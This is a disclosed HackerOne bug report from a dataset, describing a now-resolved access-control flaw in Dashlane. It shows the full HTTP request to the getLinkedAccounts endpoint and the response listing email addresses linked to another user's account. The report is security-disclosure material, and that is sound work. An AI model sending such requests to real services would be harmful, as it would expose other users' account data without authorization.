---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '152407'
original_report_id: '152407'
title: Missing Access Control(IDOR) To Know LinkedAccounts
weakness: Improper Authentication - Generic
team_handle: dashlane
created_at: '2016-07-20T03:39:42.288Z'
disclosed_at: '2017-06-26T09:36:27.692Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 19
tags:
- hackerone
- improper-authentication-generic
---

# Missing Access Control(IDOR) To Know LinkedAccounts

## Metadata

- HackerOne Report ID: 152407
- Weakness: Improper Authentication - Generic
- Program: dashlane
- Disclosed At: 2017-06-26T09:36:27.692Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hello Team,

While Digging your Application I Came to Endpoint Where I Was Able to Check Whether Email is been Used in Multiple Account's or not , And Also Email's Are Getting Leaked .

You have Feature to Enter Email To get Token :

{F105969} 

As you can see from the above Screenshot , I'm Logged in as (arbaz.owasp@gmail.com) and i put the Email (pentester.owasp@gmail.com) For Getting Code's Which Means I Have Linked my Account into Another Account.

---------------------------------------------------------------------------------------------------------------------------------------
Your Endpoint Request :

POST /1/account/getLinkedAccounts HTTP/1.1
Host: www.dashlane.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Referer: https://www.dashlane.com/business/try
Content-Length: 31
Cookie: 
Connection: close

email=pentester.owasp@gmail.com

----------------------------------------------------------------------------------------------------------------
Response :

{"code":200,"message":"OK","content":{"logins":["pentester.owasp@gmail.com","arbaz.owasp@gmail.com","hacker.arbaz@gmail.com"]}}

------------------------------------------------------------------------------------------------------------------
From the Above Response You Can See into Which Which Accounts , Email Have been Linked.  
 
{F105970}

Thanks!

Best,
Arbaz

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
